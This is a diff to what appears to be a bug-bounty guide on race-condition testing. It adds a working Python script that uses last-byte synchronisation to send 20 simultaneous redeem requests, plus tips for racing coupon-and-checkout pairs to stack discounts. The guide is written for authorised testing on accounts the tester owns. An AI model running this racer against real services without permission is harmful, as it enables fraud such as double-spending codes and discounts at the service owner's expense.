@@ -37,7 +37,32 @@ def handleResponse(req, interesting):
     table.add(req)
 ```
 
-`engine.queue` without the `gate` argument does **not** last-byte-sync; `openGate` then does nothing useful. HTTP/1.1 `curl &` and Repeater "send group" are a weaker first pass (millisecond spread). Use them to find a candidate, then confirm with the gate above.
+`engine.queue` without the `gate` argument does **not** last-byte-sync; `openGate` then does nothing useful. HTTP/1.1 `curl &` and Repeater "send group" are a weaker first pass (millisecond spread). Use them to find a candidate, then confirm with the gate above. On HTTP/2, warm the connection with one throwaway request before queuing the batch so connection setup does not stagger the first streams (Turbo Intruder does this automatically; raw clients must do it explicitly).
+
+No Burp: HTTP/1.1 last-byte sync. Weaker than one HTTP/2 connection, stronger than unsynced `curl &`. N=20, one object, then re-read state.
+
+```python
+import socket, ssl, threading
+HOST, PATH, COOKIE = "TARGET", "/redeem", "session=YOURTEST"
+BODY = b"code=ONCE"
+HEAD = (
+    f"POST {PATH} HTTP/1.1\r\nHost: {HOST}\r\nCookie: {COOKIE}\r\n"
+    f"Content-Type: application/x-www-form-urlencoded\r\n"
+    f"Content-Length: {len(BODY)}\r\nConnection: close\r\n\r\n"
+).encode()
+req = HEAD + BODY
+N, bar = 20, threading.Barrier(20)
+def one():
+    raw = socket.create_connection((HOST, 443), timeout=10)
+    s = ssl.create_default_context().wrap_socket(raw, server_hostname=HOST)
+    s.sendall(req[:-1]); bar.wait(timeout=5); s.sendall(req[-1:])
+    print(s.recv(2048).split(b"\r\n", 1)[0])
+    s.close()
+ts = [threading.Thread(target=one) for _ in range(N)]
+[t.start() for t in ts]; [t.join() for t in ts]
+```
+
+**Cross-endpoint (same gate, two paths).** Limit-overrun is often not "the same POST × N". Queue the **write** and the **consume** together (apply coupon + checkout, change-email + confirm, hold seat + pay) so they share one `openGate`. Two different bodies, one flush. Re-read both objects. If only one endpoint exists, stay on the table below.
 
 GraphQL: aliases in one document are concurrent only if the server actually parallelizes resolvers. If aliases run serially, send N HTTP requests instead (`hunt-graphql`).
 
@@ -79,6 +104,7 @@ Email-change and reset races: two in-scope accounts you own. Do not race a victi
 ## Chains
 
 - Double redeem → direct balance change (`hunt-business-logic`).
+- Coupon + checkout in one gate → paid order with stacked discounts; quote the ledger, not two 200s.
 - Email-change race → confirmation token for address B while the account shows A → `hunt-ato`.
 - Quota race → extra admin seat or API key → use one extra object, stop.
 - GraphQL alias or batch of the same mutation → this skill's HTTP layer if aliases are serial.
